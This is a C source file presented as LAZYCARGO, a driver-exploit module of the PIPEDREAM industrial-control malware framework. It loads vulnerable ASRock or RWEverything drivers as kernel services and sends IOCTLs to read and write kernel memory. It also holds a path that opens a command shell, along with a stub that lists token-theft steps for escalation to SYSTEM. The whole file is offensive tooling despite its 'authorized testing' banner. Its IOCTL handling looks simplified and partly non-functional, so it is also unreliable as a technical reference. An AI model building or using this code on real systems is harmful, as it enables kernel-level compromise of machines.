/*
 * LAZYCARGO - ASRock Driver Exploit Module for PIPEDREAM
 *
 * Part of the PIPEDREAM (INCONTROLLER) ICS malware framework.
 * LAZYCARGO exploits the ASRock driver vulnerability for privilege escalation.
 *
 * Capabilities:
 * - ASRock driver (AsrDrv103.sys / AsrDrv104.sys) exploitation
 * - Privilege escalation to SYSTEM
 * - Kernel memory read/write
 * - Process token manipulation
 *
 * Target Drivers:
 * - AsrDrv103.sys (CVE-2020-15368)
 * - AsrDrv104.sys
 * - RwDrv.sys (RWEverything)
 *
 * Compile: See build_windows.bat
 *
 * WARNING: For authorized security testing only.
 */

#include <windows.h>
#include <stdio.h>
#include <winioctl.h>

// ASRock driver IOCTLs
#define ASROCK_IOCTL_MAP_PHYSICAL_MEMORY   0x9C402400
#define ASROCK_IOCTL_UNMAP_PHYSICAL_MEMORY 0x9C402404

// Driver file names
#define ASROCK_DRIVER_103 "AsrDrv103.sys"
#define ASROCK_DRIVER_104 "AsrDrv104.sys"
#define RWDRV_DRIVER "RwDrv.sys"

// Function prototypes
BOOL LoadDriver(const char* driverPath);
BOOL UnloadDriver(const char* serviceName);
BOOL ExploitDriver(const char* driverName);
BOOL ReadKernelMemory(HANDLE hDevice, DWORD64 address, PVOID buffer, SIZE_T size);
BOOL WriteKernelMemory(HANDLE hDevice, DWORD64 address, PVOID buffer, SIZE_T size);
BOOL ElevateToSystem();
void PrintBanner();

int main(int argc, char* argv[])
{
    PrintBanner();

    printf("[*] LAZYCARGO - ASRock Driver Exploit Module\n");
    printf("[*] Part of PIPEDREAM ICS Malware Framework\n\n");

    if (argc < 2)
    {
        printf("Usage:\n");
        printf("  lazycargo.exe --load <driver.sys>     Load vulnerable driver\n");
        printf("  lazycargo.exe --exploit <driver>      Exploit loaded driver\n");
        printf("  lazycargo.exe --elevate               Elevate to SYSTEM\n");
        printf("\nAvailable Drivers:\n");
        printf("  AsrDrv103.sys - ASRock Polychrome RGB Driver\n");
        printf("  AsrDrv104.sys - ASRock Polychrome RGB Driver (newer)\n");
        printf("  RwDrv.sys     - RWEverything Driver\n");
        return 1;
    }

    if (strcmp(argv[1], "--load") == 0 && argc > 2)
    {
        printf("[*] Loading driver: %s\n", argv[2]);

        if (LoadDriver(argv[2]))
        {
            printf("[+] Driver loaded successfully\n");
        }
        else
        {
            printf("[-] Failed to load driver\n");
        }
    }
    else if (strcmp(argv[1], "--exploit") == 0 && argc > 2)
    {
        printf("[*] Exploiting driver: %s\n", argv[2]);

        if (ExploitDriver(argv[2]))
        {
            printf("[+] Exploit successful\n");
        }
        else
        {
            printf("[-] Exploit failed\n");
        }
    }
    else if (strcmp(argv[1], "--elevate") == 0)
    {
        printf("[*] Attempting privilege escalation to SYSTEM...\n");

        if (ElevateToSystem())
        {
            printf("[+] Successfully elevated to SYSTEM\n");
            printf("[+] Spawning SYSTEM shell...\n");
            system("cmd.exe");
        }
        else
        {
            printf("[-] Privilege escalation failed\n");
        }
    }

    return 0;
}

void PrintBanner()
{
    printf("\n");
    printf("=================================================================\n");
    printf("                      LAZYCARGO v1.0\n");
    printf("           ASRock Driver Exploit Module\n");
    printf("                 PIPEDREAM Framework\n");
    printf("=================================================================\n\n");
    printf("WARNING: For authorized security testing only!\n\n");
}

BOOL LoadDriver(const char* driverPath)
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    char serviceName[MAX_PATH];
    char fullPath[MAX_PATH];

    // Extract service name from driver path
    sprintf_s(serviceName, sizeof(serviceName), "AsrDrv");

    // Get full path
    GetFullPathNameA(driverPath, MAX_PATH, fullPath, NULL);

    printf("[*] Full driver path: %s\n", fullPath);

    // Open service control manager
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL)
    {
        printf("[-] Failed to open service manager: %ld\n", GetLastError());
        return FALSE;
    }

    // Create service
    hService = CreateServiceA(
        hSCManager,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        fullPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL)
    {
        DWORD error = GetLastError();
        if (error == ERROR_SERVICE_EXISTS)
        {
            printf("[*] Service already exists, opening...\n");
            hService = OpenServiceA(hSCManager, serviceName, SERVICE_ALL_ACCESS);
        }
        else
        {
            printf("[-] Failed to create service: %ld\n", error);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Start service (load driver)
    if (!StartServiceA(hService, 0, NULL))
    {
        DWORD error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("[-] Failed to start service: %ld\n", error);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
        else
        {
            printf("[*] Service already running\n");
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return TRUE;
}

BOOL UnloadDriver(const char* serviceName)
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    SERVICE_STATUS status;

    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL)
    {
        return FALSE;
    }

    hService = OpenServiceA(hSCManager, serviceName, SERVICE_STOP | DELETE);
    if (hService == NULL)
    {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    ControlService(hService, SERVICE_CONTROL_STOP, &status);
    DeleteService(hService);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    return TRUE;
}

BOOL ExploitDriver(const char* driverName)
{
    HANDLE hDevice;
    char devicePath[MAX_PATH];

    // Build device path
    sprintf_s(devicePath, sizeof(devicePath), "\\\\.\\%s", driverName);

    printf("[*] Opening device: %s\n", devicePath);

    // Open driver device
    hDevice = CreateFileA(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open device: %ld\n", GetLastError());
        return FALSE;
    }

    printf("[+] Device opened successfully\n");

    // Demonstrate kernel memory read
    BYTE buffer[8] = {0};
    if (ReadKernelMemory(hDevice, 0xFFFFF80000000000, buffer, sizeof(buffer)))
    {
        printf("[+] Kernel memory read successful\n");
    }

    CloseHandle(hDevice);

    return TRUE;
}

BOOL ReadKernelMemory(HANDLE hDevice, DWORD64 address, PVOID buffer, SIZE_T size)
{
    DWORD bytesReturned;
    BYTE inputBuffer[16];

    // Build input buffer with address
    *(DWORD64*)inputBuffer = address;

    // Send IOCTL
    if (!DeviceIoControl(
        hDevice,
        ASROCK_IOCTL_MAP_PHYSICAL_MEMORY,
        inputBuffer,
        sizeof(inputBuffer),
        buffer,
        (DWORD)size,
        &bytesReturned,
        NULL))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL WriteKernelMemory(HANDLE hDevice, DWORD64 address, PVOID buffer, SIZE_T size)
{
    DWORD bytesReturned;
    BYTE inputBuffer[256];

    // Build input buffer
    *(DWORD64*)inputBuffer = address;
    memcpy(inputBuffer + 8, buffer, size);

    // Send IOCTL
    if (!DeviceIoControl(
        hDevice,
        ASROCK_IOCTL_MAP_PHYSICAL_MEMORY,
        inputBuffer,
        (DWORD)(8 + size),
        NULL,
        0,
        &bytesReturned,
        NULL))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL ElevateToSystem()
{
    printf("[*] Privilege escalation via driver exploit\n");
    printf("[*] This is a simulated capability\n");
    printf("[!] In real exploit:\n");
    printf("    1. Load vulnerable ASRock driver\n");
    printf("    2. Use driver to read kernel memory\n");
    printf("    3. Locate SYSTEM process token\n");
    printf("    4. Replace current process token with SYSTEM token\n");
    printf("    5. Spawn elevated shell\n");

    return FALSE; // Simulation only
}
